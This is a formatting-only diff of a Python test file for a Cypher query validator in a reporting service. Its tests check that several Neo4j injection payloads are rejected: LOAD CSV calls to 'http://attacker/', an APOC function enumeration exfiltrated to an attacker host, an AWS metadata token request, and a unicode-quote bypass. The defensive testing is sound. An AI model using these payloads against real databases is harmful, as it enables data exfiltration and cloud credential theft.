@@ -9,9 +9,7 @@ def test_validate_query_success(mocker):
     mocker.patch(
         "reporting.services.query_validator.SyntaxValidator"
     ).return_value.validate.return_value = (True, [])
-    mocker.patch(
-        "reporting.services.query_validator._get_neo4j_client"
-    )
+    mocker.patch("reporting.services.query_validator._get_neo4j_client")
     mocker.patch(
         "reporting.services.query_validator.SchemaValidator"
     ).return_value.validate.return_value = (True, [])
@@ -29,9 +27,7 @@ def test_validate_query_syntax_error(mocker):
         False,
         [{"code": "SyntaxError", "description": "Syntax error at position 5"}],
     )
-    mocker.patch(
-        "reporting.services.query_validator._get_neo4j_client"
-    )
+    mocker.patch("reporting.services.query_validator._get_neo4j_client")
 
     with pytest.raises(QueryValidationError) as exc_info:
         validate_query("MATC (n) RETURN n")
@@ -43,9 +39,7 @@ def test_validate_query_schema_error(mocker):
     mocker.patch(
         "reporting.services.query_validator.SyntaxValidator"
     ).return_value.validate.return_value = (True, [])
-    mocker.patch(
-        "reporting.services.query_validator._get_neo4j_client"
-    )
+    mocker.patch("reporting.services.query_validator._get_neo4j_client")
     mocker.patch(
         "reporting.services.query_validator.SchemaValidator"
     ).return_value.validate.return_value = (
@@ -66,9 +60,7 @@ def test_validate_query_properties_error(mocker):
     mocker.patch(
         "reporting.services.query_validator.SyntaxValidator"
     ).return_value.validate.return_value = (True, [])
-    mocker.patch(
-        "reporting.services.query_validator._get_neo4j_client"
-    )
+    mocker.patch("reporting.services.query_validator._get_neo4j_client")
     mocker.patch(
         "reporting.services.query_validator.SchemaValidator"
     ).return_value.validate.return_value = (True, [])
@@ -89,9 +81,7 @@ def test_validate_query_multiple_errors(mocker):
     mocker.patch(
         "reporting.services.query_validator.SyntaxValidator"
     ).return_value.validate.return_value = (True, [])
-    mocker.patch(
-        "reporting.services.query_validator._get_neo4j_client"
-    )
+    mocker.patch("reporting.services.query_validator._get_neo4j_client")
     mocker.patch(
         "reporting.services.query_validator.SchemaValidator"
     ).return_value.validate.return_value = (
@@ -114,9 +104,7 @@ def test_validate_query_write_rejected(mocker):
     mocker.patch(
         "reporting.services.query_validator.SyntaxValidator"
     ).return_value.validate.return_value = (True, [])
-    mocker.patch(
-        "reporting.services.query_validator._get_neo4j_client"
-    )
+    mocker.patch("reporting.services.query_validator._get_neo4j_client")
 
     with pytest.raises(QueryValidationError):
         validate_query("CREATE (n:Person {name: 'Alice'}) RETURN n")
@@ -245,9 +233,7 @@ class TestNeo4jectionDataExfiltration:
 
     def test_load_csv_standalone(self):
         with pytest.raises(QueryValidationError):
-            _check_read_only(
-                "LOAD CSV FROM 'http://attacker/data' AS row RETURN row"
-            )
+            _check_read_only("LOAD CSV FROM 'http://attacker/data' AS row RETURN row")
 
 
 class TestNeo4jectionAPOCExploits:
@@ -272,7 +258,7 @@ class TestNeo4jectionAPOCExploits:
         with pytest.raises(QueryValidationError):
             _check_read_only(
                 "' OR 1=1 WITH apoc.cypher.runFirstColumnMany("
-                "\"SHOW FUNCTIONS YIELD name RETURN name\",{}) as names "
+                '"SHOW FUNCTIONS YIELD name RETURN name",{}) as names '
                 "UNWIND names AS name "
                 "LOAD CSV FROM 'http://attacker/'+name as _l RETURN 1 //"
             )
@@ -296,9 +282,9 @@ class TestNeo4jectionCloudMetadata:
         with pytest.raises(QueryValidationError):
             _check_read_only(
                 "CALL apoc.load.csvParams("
-                "\"http://169.254.169.254/latest/api/token\", "
-                "{method: \"PUT\",`X-aws-ec2-metadata-token-ttl-seconds`:21600},"
-                "\"\",{header:FALSE}) yield list "
+                '"http://169.254.169.254/latest/api/token", '
+                '{method: "PUT",`X-aws-ec2-metadata-token-ttl-seconds`:21600},'
+                '"",{header:FALSE}) yield list '
                 "WITH list[0] as token RETURN token"
             )
 
@@ -310,7 +296,7 @@ class TestNeo4jectionUnicodeBypass:
         with pytest.raises(QueryValidationError):
             _check_read_only(
                 "\u0027}) RETURN 0 as _0 UNION CALL db.labels() yield label "
-                "LOAD CSV FROM \"http://attacker/\"+label RETURN 0 as _o //"
+                'LOAD CSV FROM "http://attacker/"+label RETURN 0 as _o //'
             )
 
 
